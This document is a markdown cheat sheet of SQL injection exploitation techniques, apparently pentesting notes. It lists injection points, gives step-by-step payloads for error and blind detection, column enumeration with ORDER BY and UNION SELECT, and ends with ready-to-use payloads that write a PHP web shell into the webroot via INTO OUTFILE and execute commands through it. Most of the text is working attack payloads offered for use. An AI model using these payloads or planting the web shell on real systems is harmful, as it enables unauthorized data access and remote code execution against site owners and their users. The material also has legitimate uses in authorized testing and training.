# SQL Injection Exploitation
> Tips & tricks for exploiting SQLi. Note the breadth of possiblities that SQLi can be used for. Identifying an instance of SQLi could mean an entry point to the underlying server, authentication bypass, RCE, file read, etc. 

### Common places
- URL parameters (GET requests)
	- ```http://[ip]/vulnerable.php?id=1```
- POST body parameters
	- ```username=example&password=example```
- Cookies
	- ```Cookie: trackingID=1234567890;```
- Authentication fields
	- this is kinda included in the GET/POST requests
	- will always be tied to auth bypass if it's in a user:pass field
- Any place on the app where you would think it would make sense for the app to need to retrieve stored data to present it to a user
	- Example: a shopping application that needs to display the specifics of an item when a user clicks to view it


### Manual Process 
1. Identify user input fields in the app, see above.
2. Add a single/double quote by itself, and see if an error is caused
	- an error returned from this implies vulnerable but if there is no error it *could still be vulnerable*
		- if no error is thrown try logic based payloads to see if different content returns, if it does then then the SQLi is blind:
			- ```http://[ip]/vulnerable.php?id=1' AND 1=1; -- ``` -> should return the same content
			- ```http://[ip]/vulnerable.php?id=1' AND 1=2; -- ``` -> should return different content 
			- Also try: ```http://[ip]/vulnerable.php?id=1-sleep(10)``` -> if this causes the application to sit inlimbo for 10 seconds then the parameter is vulnerable
	- ```http://[ip]/vulnerable.php?id=1'```
3. Use ORDER BY statements to enmerate the number of columns returned:
	- ```http://[ip]/vulnerable.php?id=1' ORDER BY 1 -- ```
	- increment this number until an error is thrown. The last valid request before the error is the number of columns
4. Find the columns that are actually return data
	- ```http://[ip]/vulnerable.php?id=1' UNION SELECT 1,2,3,4,5,6 -- ```
	- Note the numbers after the UNION SELECT statement should be equal to the column numbers identified by the ORDER BY statement
5. Retrieve data from the database by substituting payloads into the positions that are returning data
	- all DBMS's have different syntax, see [the NetSPI SQLiWiki](https://sqlwiki.netspi.com/) for payloads based on the DBMS that is behind your app

### Getting RCE on Blind/Error based SQLi
- Getting a webshell (Windows server): 
	- ```http://[ip]/vulnerable.php?id=1' UNION ALL SELECT 1,2,3, "<?php echo shell_exec($_GET['cmd']);?>",5,6 into OUTFILE 'c:/xampp/htdocs/cmd.php'```
	- ```http://[ip]/cmd.php?cmd=ls```
- Getting a webshell (Linux server):
	- ```http://[ip]/vulnerable.php?id=1' UNION ALL SELECT 1,2,3, "<?php echo shell_exec($_GET['cmd']);?>",5,6 into OUTFILE '/var/www/html/cmd.php'```
		- note it's worth trying /var/www/cmd.php as the webroot here as well
	- ```http://[ip]/cmd.php?cmd=ls```




